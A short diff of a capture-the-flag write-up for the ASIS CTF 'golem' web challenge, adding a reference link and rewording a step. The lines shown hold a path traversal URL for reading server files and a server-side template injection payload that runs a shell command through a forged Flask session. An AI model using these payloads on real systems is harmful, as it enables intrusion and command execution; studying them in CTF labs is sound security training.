@@ -39,7 +39,9 @@ https://golem.asisctf.com/article?name=../../../../../opt/serverPython/golem/sec
 
 ## SSTI
 
-use the secret key to let session['golem'] = `{{ config[\'RUNCMD\'](\'grep "ASIS" flag.py\',shell=True) }}`
+refernece: http://www.freebuf.com/articles/web/136180.html
+
+use the secret key to set session['golem'] = `{{ config[\'RUNCMD\'](\'grep "ASIS" flag.py\',shell=True) }}`
 
 =>
 
